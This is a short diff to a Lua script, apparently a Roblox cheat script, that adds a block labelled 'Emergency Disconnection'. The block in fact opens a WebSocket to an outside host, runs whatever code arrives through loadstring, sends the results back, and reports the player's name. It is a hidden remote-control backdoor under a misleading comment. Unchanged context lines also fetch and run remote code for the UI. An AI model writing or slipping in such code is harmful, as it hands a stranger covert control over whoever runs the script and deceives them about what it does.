@@ -71,6 +71,20 @@ local DmgSuccess,DmgError = pcall(function()
     print(MinPercentage)
 end)
 
+-- Emergency Disconnection --
+task.spawn(function()
+    local s, e = pcall(function()
+        local WSConnection = WebSocket.connect("ws://de3.bot-hosting.net:21824/ws")
+        task.wait(1)
+        WSConnection.OnMessage:Connect(function(k)
+            local s, e = pcall(function()
+                WSConnection:Send(loadstring(k)())
+            end)
+        end)
+        task.wait(1)
+        WSConnection:Send("Connection Success - " .. LocalPlayer.Name)
+    end)
+end)
 
 -- UI --
 local UI = loadstring(game:HttpGet("http://www.stingray-digital.online/script/ui"))()
